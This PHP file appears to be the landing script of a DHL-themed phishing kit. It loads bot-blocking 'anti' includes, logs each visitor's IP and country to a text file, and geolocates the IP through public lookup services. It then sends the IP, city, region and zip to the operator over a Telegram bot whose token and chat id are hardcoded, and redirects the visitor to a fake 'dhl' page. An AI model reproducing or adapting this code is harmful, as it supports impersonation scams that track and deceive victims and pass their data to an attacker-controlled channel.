<?php
require "prevents/anti1.php";
require "prevents/anti2.php";
require "prevents/anti3.php";
require "prevents/anti4.php";
require "prevents/anti5.php";
require "prevents/anti6.php";
require "prevents/anti7.php";
require "prevents/anti8.php";


$ip = getenv("REMOTE_ADDR");


$file = fopen("VISITS.txt","a");
$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip.""));
$countryname = $details->geoplugin_countryName;
$_SESSION["country"] = $countryname;



fwrite($file,$ip."  -  "."Country: ".$countryname."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

 $IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
 $COUNTRY = $IP_LOOKUP->country . "\r\n";
 $CITY    = $IP_LOOKUP->city . "\r\n";
 $REGION  = $IP_LOOKUP->region . "\r\n";
 $STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

    $token = "5221077203:AAEmYvcjgjxtSouyh4fikv1DF_FCBP4UkqM";
    $text = "✈️ <strong>NEW DHL VISIT :)✈️</strong> \r\n".
    $text = "🌐 IP  =>  "."http://www.geoiptool.com/?IP="."$ip".
    $text = "\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: ".$STATE."zip : " .$ZIPCODE.
    $text= "⚡ Stay Tuned baby ⚡\r\n";

    $encodedMsg = urlencode($text);
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=2058113522&text=$encodedMsg&parse_mode=HTML");

	exit(header("Location: dhl"));
?>